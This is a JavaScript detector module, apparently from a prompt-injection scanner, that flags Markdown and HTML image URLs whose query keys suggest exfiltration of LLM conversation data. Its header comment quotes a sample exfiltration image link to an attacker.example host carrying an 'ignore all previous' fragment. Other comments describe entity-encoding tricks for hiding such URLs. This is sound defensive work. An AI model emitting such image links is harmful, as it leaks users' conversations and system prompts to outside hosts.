/**
 * S4: Markdown image URL exfiltration detection.
 *
 * Attack model: an LLM-rendered Markdown document contains an image whose URL
 * carries data-exfiltration parameters, e.g.
 *
 *   ![cute cat](http://attacker.example/log?prompt=ignore+all+previous)
 *
 * When the rendered image is fetched by the client (or by a tool acting on
 * the model's behalf), the conversation context or system prompt rides along
 * inside the URL's query string. This module flags those URLs by inspecting
 * the *key names* only — never the values — so legitimate signed URLs
 * (Firebase, S3 X-Amz-*, Discord CDN, etc.) stay safe.
 *
 * Inputs scanned:
 *   - inline images:    ![alt](url "title")
 *   - reference images: ![alt][id]   with [id]: url
 *   - HTML <img>:       <img src="url"> / <img src='url'>
 *
 * v1.13.0 entity-decoded HTML src (html-img path ONLY):
 *   Browsers entity-decode HTML attribute values BEFORE fetching them, so an
 *   attacker who controls a token like `&quot;http://attacker.example/?…&quot;`
 *   or `?a=A&amp;b=B` inside rendered HTML still successfully exfiltrates.
 *   We mirror that browser behaviour by running a *minimal* entity decoder
 *   over the raw src token before classifyUrl(). Scope:
 *     - applied to RE_HTML_IMG matches only.
 *     - decoder supports: &quot; &apos; &amp; &lt; &gt; + numeric &#NN; / &#xHH;
 *       (no generic HTML entities library — keeps bundle tight and surface
 *       under R12 control).
 *     - inline `![alt](url)` and reference-image paths are NOT entity-decoded:
 *       CommonMark does not decode entities inside URLs in parens, and benign
 *       markdown freely contains `&amp;` in alt-text / titles. Adding decode
 *       there would regress benign corpora.
 *     - bracket contract (R13): position+matchLen still anchors on the RAW
 *       (entity-encoded) src token in `content`, NOT on the decoded URL.
 *       slice(position, position+matchLen) returns the raw token verbatim.
 *     - meta.entityDecoded === true is the only new meta field — added so the
 *       UI detail row can show the user that the displayed src was decoded.
 *
 * Severity (v1.9.0 — host-tier asymmetry, option D):
 *   - safeHost (imageOnlyHosts suffix
 *     OR userContentHosts exact)      -> short-circuit, no finding
 *   - data: / mailto: / javascript:   -> skip
 *   - non-http(s) / parse error       -> skip
 *   - unknown host (incl. subdomain
 *     of userContentHost):
 *       strong >= 1                   -> danger (strong key)
 *       weak   >= 1                   -> warning (weak key)   [NEW — was weak>=2]
 *   - public IP literal host:
 *       strong >= 1                   -> danger (public IP host)
 *       weak   >= 1                   -> warning (public IP host)
 *   - private/loopback IP literal:
 *       strong >= 1                   -> warning (private IP host)
 *       weak   only                   -> skip (silent on benign baseline)
 *
 * Returned finding shape:
 *   {
 *     element:  'md-image' | 'md-image-ref' | 'html-img',
 *     technique: short human-readable description,
 *     content:  the URL itself (escaped, <=300 chars),
 *     position: UTF-16 offset of the URL inside `content`,
 *     matchLen: URL length in UTF-16 code units,
 *     severity: 'danger' | 'warning',
 *   }
 *
 * R12 (Critical): only the URL itself is echoed back. Decoded shadow strings
 * never appear in the response body.
 */

import { escapeForDisplay, loadRule } from "./utils.js";

const RULE = loadRule("exfil-patterns.json");
const STRONG_KEYS = new Set(RULE.strongKeys.map((s) => s.toLowerCase()));
const WEAK_KEYS = new Set(RULE.weakKeys.map((s) => s.toLowerCase()));
// Two-tier host allowlist (Bug #3 fix).
//   imageOnlyHosts: dedicated CDN / image hosts. Suffix-match allowed because
//     a subdomain of `cdn.jsdelivr.net` is still a jsDelivr-served asset.
//   userContentHosts: user-content sites where ANY visitor can register an
//     account and host a file (notion.so) OR where the bucket name is part
//     of the hostname (`<bucket>.storage.googleapis.com`,
//     `<attacker>.googleusercontent.com`). EXACT-host match only —
//     subdomain-level allowlisting on these would let attacker subdomains
//     short-circuit the safety check, which was the original FN.
//
//   Note: `googleusercontent.com`, `storage.googleapis.com`,
//   `firebasestorage.googleapis.com` are DELIBERATELY in NEITHER list:
//   any subdomain is attacker-controllable and even the bare 2LDs are
//   user-content stores. Strong key on those should still flag as danger.
const IMAGE_ONLY_HOSTS = (RULE.imageOnlyHosts || []).map((s) => s.toLowerCase());
const USER_CONTENT_HOSTS = new Set(
  (RULE.userContentHosts || []).map((s) => s.toLowerCase())
);
// Back-compat: if a legacy rules file still ships `safeHosts`, treat each as
// an exact-only host (the safer default). We don't suffix-match legacy entries
// because that was the FN we're fixing.
const LEGACY_SAFE_HOSTS = new Set(
  (RULE.safeHosts || []).map((s) => s.toLowerCase())
);

// --- helpers ------------------------------------------------------------

// v1.13.0: minimal HTML-entity decoder for the html-img src pre-pass.
// Scope: 5 named entities (browsers decode these inside attribute values
// before fetching) + 2 numeric forms (decimal `&#NN;` / hex `&#xHH;`). We
// deliberately do NOT pull in a generic entities library — the realistic
// attacker permutations are covered by this minimal set, and a broader
// surface would risk over-decoding inside benign rendered HTML.
//
// Performance: caller short-circuits if the raw token contains no `&`, so
// this function is only invoked when entities are actually present.
const ENTITY_NAMED = {
  quot: '"',
  apos: "'",
  amp: "&",
  lt: "<",
  gt: ">",
};
function decodeBasicHtmlEntities(s) {
  return s.replace(/&(?:(quot|apos|amp|lt|gt)|#(\d+)|#[xX]([0-9a-fA-F]+));/g, (_, name, dec, hex) => {
    if (name) return ENTITY_NAMED[name];
    if (dec) {
      const cp = Number(dec);
      if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return _;
      try { return String.fromCodePoint(cp); } catch { return _; }
    }
    if (hex) {
      const cp = parseInt(hex, 16);
      if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return _;
      try { return String.fromCodePoint(cp); } catch { return _; }
    }
    return _;
  });
}

// Strip a single leading + trailing matched quote character (`"` / `'`) from
// the decoded src, if and only if the decoded form starts and ends with the
// same quote char. This handles the `&quot;https://...&quot;` shape where the
// quotes themselves were entity-encoded so RE_HTML_IMG captured them as part
// of the bare-src token.
function stripDecodedSurroundingQuotes(s) {
  if (s.length < 2) return s;
  const first = s.charCodeAt(0);
  const last = s.charCodeAt(s.length - 1);
  // 0x22 = ", 0x27 = '
  if ((first === 0x22 || first === 0x27) && first === last) {
    return s.slice(1, -1);
  }
  return s;
}

function isSafeHost(hostname) {
  if (!hostname) return false;
  const h = hostname.toLowerCase();
  // Tier 1: dedicated image/CDN hosts — exact OR suffix.
  for (const safe of IMAGE_ONLY_HOSTS) {
    if (h === safe || h.endsWith("." + safe)) return true;
  }
  // Tier 2: user-content sites — EXACT only.
  if (USER_CONTENT_HOSTS.has(h)) return true;
  // Tier 3 (back-compat): legacy `safeHosts` entries are exact-only too.
  if (LEGACY_SAFE_HOSTS.has(h)) return true;
  return false;
}

// IPv4 dotted quad
const IPV4_RE = /^(?:\d{1,3}\.){3}\d{1,3}$/;

function isIPv4(hostname) {
  if (!IPV4_RE.test(hostname)) return false;
  return hostname.split(".").every((n) => {
    const v = Number(n);
    return Number.isInteger(v) && v >= 0 && v <= 255;
  });
}

function isIPv6Literal(hostname) {
  // WHATWG URL keeps brackets on hostname for IPv6 literals (e.g. "[::1]").
  // Strip any leading `[` / trailing `]` before testing so a host of "[::1]"
  // is recognised as a v6 literal. We detect at least one colon and only
  // hex/colon/dot (for v4-mapped tail).
  if (!hostname.includes(":")) return false;
  const bare = hostname.replace(/^\[|\]$/g, "");
  return /^[0-9a-fA-F:.]+$/.test(bare);
}

function isPrivateIPv4(hostname) {
  if (!isIPv4(hostname)) return false;
  const [a, b] = hostname.split(".").map(Number);
  if (a === 10) return true;
  if (a === 127) return true; // loopback
  if (a === 0) return true;
  if (a === 169 && b === 254) return true; // link-local
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  return false;
}

function stripV6Brackets(hostname) {
  return hostname.replace(/^\[|\]$/g, "");
}

function isLoopbackIPv6(hostname) {
  // ::1 in any compact form. Strip brackets first since WHATWG URL keeps them.
  const bare = stripV6Brackets(hostname);
  return bare === "::1" || bare === "0:0:0:0:0:0:0:1";
}

function isPrivateIPv6(hostname) {
  if (!isIPv6Literal(hostname)) return false;
  if (isLoopbackIPv6(hostname)) return true;
  const h = stripV6Brackets(hostname).toLowerCase();
  // fc00::/7 unique local, fe80::/10 link-local
  if (h.startsWith("fc") || h.startsWith("fd")) return true;
  if (h.startsWith("fe80:") || h.startsWith("fe8") || h.startsWith("fe9") || h.startsWith("fea") || h.startsWith("feb")) return true;
  return false;
}

function isPrivateOrLoopback(hostname) {
  if (isPrivateIPv4(hostname)) return true;
  if (isPrivateIPv6(hostname)) return true;
  if (hostname === "localhost") return true;
  return false;
}

function isIpLiteral(hostname) {
  return isIPv4(hostname) || isIPv6Literal(hostname);
}

/**
 * Parse the URL's query string and classify keys.
 * Returns { strong: number, weak: number, sampleKey: string|null }.
 *
 * sampleKey is whichever strong key fired first (for the technique label) or,
 * absent that, the first weak key that fired.
 */
function classifyQueryKeys(urlObj) {
  let strong = 0;
  let weak = 0;
  let sampleStrong = null;
  let sampleWeak = null;
  for (const [rawKey] of urlObj.searchParams.entries()) {
    const key = rawKey.toLowerCase();
    if (STRONG_KEYS.has(key)) {
      strong++;
      if (sampleStrong === null) sampleStrong = key;
    } else if (WEAK_KEYS.has(key)) {
      weak++;
      if (sampleWeak === null) sampleWeak = key;
    }
  }
  return { strong, weak, sampleStrong, sampleWeak };
}

/**
 * Classify a single URL string.
 * Returns { severity, technique, meta } or null if it should not produce a
 * finding.
 *
 * R12: `technique` is a FIXED detector-controlled phrase — no attacker-
 * controlled host or query-key name is interpolated into it (those would
 * leak into `topFindings[].label` via priority.js#labelFor). Variable data
 * is split into `meta: { host, ipKind, matchedKey }` so UIs can still
 * display the specifics on the detail row without exposing them in the
 * summary banner.
 */
function classifyUrl(rawUrl) {
  // Skip non-http(s) schemes early.
  const lower = rawUrl.trimStart().toLowerCase();
  if (
    lower.startsWith("data:") ||
    lower.startsWith("mailto:") ||
    lower.startsWith("javascript:") ||
    lower.startsWith("vbscript:") ||
    lower.startsWith("file:")
  ) {
    return null;
  }

  let urlObj;
  try {
    urlObj = new URL(rawUrl);
  } catch {
    return null;
  }
  const proto = urlObj.protocol.toLowerCase();
  if (proto !== "http:" && proto !== "https:") return null;

  const host = urlObj.hostname;
  if (!host) return null;

  // WHATWG URL keeps the brackets on IPv6 literal hostnames ("[::1]"). Strip
  // them once so every downstream check sees the bare host literal.
  const cleanHost = host.replace(/^\[|\]$/g, "");

  // R: short-circuit on safe host — nothing the path/query says matters here.
  if (isSafeHost(cleanHost)) return null;

  const { strong, weak, sampleStrong, sampleWeak } = classifyQueryKeys(urlObj);

  // IP literal logic.
  if (isIpLiteral(cleanHost)) {
    if (isPrivateOrLoopback(cleanHost)) {
      // Private / loopback IP host (10.x / 172.16-31.x / 192.168.x / 127.x /
      // ::1 / fc00::/7 / fe80::/10 / localhost).
      // v1.9.0: strong-key still warns (internal webhook to attacker-shaped
      // endpoint), but a lone weak key on private space is too noisy
      // (legitimate dev / staging webhooks routinely carry ?session= /
      // ?data= etc) — stay silent and let other detectors handle.
      if (strong >= 1) {
        return {
          severity: "warning",
          technique: "Markdown image exfiltration (private IP host)",
          meta: { host: cleanHost, ipKind: "private", matchedKey: sampleStrong },
        };
      }
      return null;
    }
    // Public IP literal: image URLs in legit docs basically never point at
    // raw public IPs, so a lone weak key is enough to warrant a warning.
    // Strong keys still escalate to danger.
    if (strong >= 1) {
      return {
        severity: "danger",
        technique: "Markdown image exfiltration (public IP host)",
        meta: { host: cleanHost, ipKind: "public", matchedKey: sampleStrong },
      };
    }
    if (weak >= 1) {
      return {
        severity: "warning",
        technique: "Markdown image exfiltration (public IP host)",
        meta: { host: cleanHost, ipKind: "public", matchedKey: sampleWeak, weakHits: weak },
      };
    }
    return null;
  }

  // Regular hostname path (host is NOT in any allowlist tier — includes raw
  // unknown hosts as well as subdomains of userContentHosts which are EXACT-
  // only, e.g. `attacker.notion.so`).
  // v1.9.0: weak threshold relaxed from >=2 to >=1. Benign image hosts that
  // legitimately carry weak query keys (analytics, signed CDN URLs, etc)
  // remain protected by the upstream `isSafeHost` short-circuit on
  // imageOnlyHosts / userContentHosts.
  if (strong >= 1) {
    return {
      severity: "danger",
      technique: "Markdown image exfiltration (strong key)",
      meta: { host: cleanHost, matchedKey: sampleStrong, strongHits: strong, weakHits: weak },
    };
  }
  if (weak >= 1) {
    return {
      severity: "warning",
      technique: "Markdown image exfiltration (weak key)",
      meta: { host: cleanHost, matchedKey: sampleWeak, weakHits: weak },
    };
  }
  return null;
}

function buildFinding(element, urlStr, position, severity, technique, meta) {
  const f = {
    element,
    technique,
    content: escapeForDisplay(urlStr.slice(0, 300)),
    position,
    matchLen: urlStr.length,
    severity,
  };
  // R12: `technique` stays fixed-phrase; `meta` carries the host / key name so
  // the UI can show them in the detail row but NOT in the banner label
  // (priority.js#labelFor never reads `meta`).
  if (meta && typeof meta === "object") f.meta = meta;
  return f;
}

// --- markdown regex set ------------------------------------------------
//
// All use the `d` (indices) flag so we can grab the *URL* span — not just the
// whole match — and map it back to the original-text offset. Group order is
// fixed across these regexes so we can index by name.

// ![alt](url "title")
//   alt = group 1  (may be empty)
//   url = group 2
const RE_INLINE_IMG = /!\[([^\]]*)\]\(\s*(\S+?)(?:\s+["'][^"']*["'])?\s*\)/gd;

// ![alt][id]
//   alt = group 1
//   id  = group 2 (case-insensitive; lowercased on lookup)
const RE_REF_IMG = /!\[([^\]]*)\]\[([^\]]+)\]/gd;

// [id]: url     (definition)
//   id  = group 1
//   url = group 2
const RE_REF_DEF = /^\s*\[([^\]]+)\]:\s*(\S+)/gmd;

// <img src="url"> / <img src='url'> / <img ... src=url ...>
//   url = group 1 (without surrounding quotes)
const RE_HTML_IMG = /<img\b[^>]*?\bsrc\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>'"]+))[^>]*>/gid;

// --- exported -----------------------------------------------------------

/**
 * S4 detector entry point.
 *
 * @param {string} content - Raw markdown or markdown-with-HTML text.
 * @returns {Array} findings (see file header for shape).
 */
export function detectMarkdownExfil(content) {
  if (!content || typeof content !== "string") return [];

  const findings = [];

  // ---- Pass 1: collect reference-image definitions ([id]: url) ----
  // Lowercased id -> { url, urlStart }. Per CommonMark, IDs are
  // case-insensitive. We capture the URL group's start offset (m.indices[2][0])
  // so the downstream ref-image finding can point `position` at the URL inside
  // the *definition line*, keeping the (position, matchLen=url.length) bracket
  // contract intact — slice(position, position+matchLen) === url.
  const refDefs = new Map();
  for (const m of content.matchAll(RE_REF_DEF)) {
    if (!m.indices || !m.indices[2]) continue;
    const id = (m[1] || "").trim().toLowerCase();
    const rawUrl = m[2] || "";
    const url = rawUrl.trim();
    if (!id || !url) continue;
    // The captured group includes the raw URL token; if the author wrote
    // leading whitespace inside the group it would have been excluded by \S+,
    // so urlStart maps directly to the URL's first character in `content`.
    const urlStart = m.indices[2][0];
    refDefs.set(id, { url, urlStart });
  }

  // ---- Pass 2: inline images ![alt](url) ----
  for (const m of content.matchAll(RE_INLINE_IMG)) {
    // m.indices is enabled via /d flag.
    if (!m.indices || !m.indices[2]) continue;
    const url = m[2];
    const [urlStart] = m.indices[2];
    const verdict = classifyUrl(url);
    if (!verdict) continue;
    findings.push(
      buildFinding("md-image", url, urlStart, verdict.severity, verdict.technique, verdict.meta)
    );
  }

  // ---- Pass 3: reference images ![alt][id] (resolved via refDefs) ----
  for (const m of content.matchAll(RE_REF_IMG)) {
    if (!m.indices) continue;
    const id = (m[2] || "").trim().toLowerCase();
    const refDef = refDefs.get(id);
    if (!refDef) continue;
    const { url, urlStart } = refDef;
    const verdict = classifyUrl(url);
    if (!verdict) continue;
    // Position points at the URL inside the *reference definition line*
    // (e.g. `[catref]: https://attacker.example/?p=PAYLOAD`), NOT at the
    // `![alt][id]` use-site. Reason: the (position, matchLen=url.length)
    // contract guarantees `content.slice(position, position+matchLen) === url`,
    // and the use-site span (`![alt][id]`) has a different length than the
    // resolved URL, so anchoring there would violate the bracket invariant.
    // The URL definition line is still the actionable surface for redaction.
    findings.push(
      buildFinding(
        "md-image-ref",
        url,
        urlStart,
        verdict.severity,
        verdict.technique,
        verdict.meta
      )
    );
  }

  // ---- Pass 4: <img src="..."> ----
  // v1.13.0: entity-decode the captured src before classifying. Browsers
  // entity-decode HTML attribute values before fetching, so an attacker can
  // hide a URL behind `&quot;…&quot;` or hide `&` query separators behind
  // `&amp;` and still successfully exfiltrate. We mirror that by:
  //   1. Try the raw token first (fast path — only decode if `&` is present).
  //   2. If raw classifies, emit the finding with the raw url verbatim.
  //   3. Otherwise, if a decoded form differs from raw and parses, classify
  //      that decoded form and (if it produces a finding) emit it with
  //      meta.entityDecoded=true and matchLen anchored on the RAW token span.
  // Bracket contract (R13): position+matchLen always anchors on the RAW src
  // token in `content`, NEVER on the decoded URL.
  for (const m of content.matchAll(RE_HTML_IMG)) {
    if (!m.indices) continue;
    // src may be in group 1 (double-quoted), 2 (single-quoted), or 3 (bare).
    let rawUrl = m[1] || m[2] || m[3] || "";
    let groupIdx = m[1] ? 1 : m[2] ? 2 : 3;
    if (!m.indices[groupIdx]) continue;
    const [urlStart] = m.indices[groupIdx];
    const rawVerdict = classifyUrl(rawUrl);
    if (rawVerdict) {
      findings.push(
        buildFinding("html-img", rawUrl, urlStart, rawVerdict.severity, rawVerdict.technique, rawVerdict.meta)
      );
      continue;
    }
    // Fast-path skip: if there's no `&` in the raw token, entity decoding is
    // a no-op — bail out early to keep cost zero on benign corpora.
    if (!rawUrl.includes("&")) continue;
    const decodedOnce = decodeBasicHtmlEntities(rawUrl);
    const decoded = stripDecodedSurroundingQuotes(decodedOnce);
    if (decoded === rawUrl) continue;
    const decodedVerdict = classifyUrl(decoded);
    if (!decodedVerdict) continue;
    // R12: technique stays fixed-phrase (it's already one of the 4 detector-
    // controlled strings from classifyUrl). We only add `entityDecoded: true`
    // to meta so the UI can flag the path.
    const meta = { ...(decodedVerdict.meta || {}), entityDecoded: true };
    // R13: bracket contract — anchor on the RAW src token span in `content`.
    // The finding `content` body comes from buildFinding(rawUrl, ...) so the
    // displayed string echoes the raw entity-encoded token, not the decoded
    // URL.
    findings.push(
      buildFinding("html-img", rawUrl, urlStart, decodedVerdict.severity, decodedVerdict.technique, meta)
    );
  }

  return findings;
}
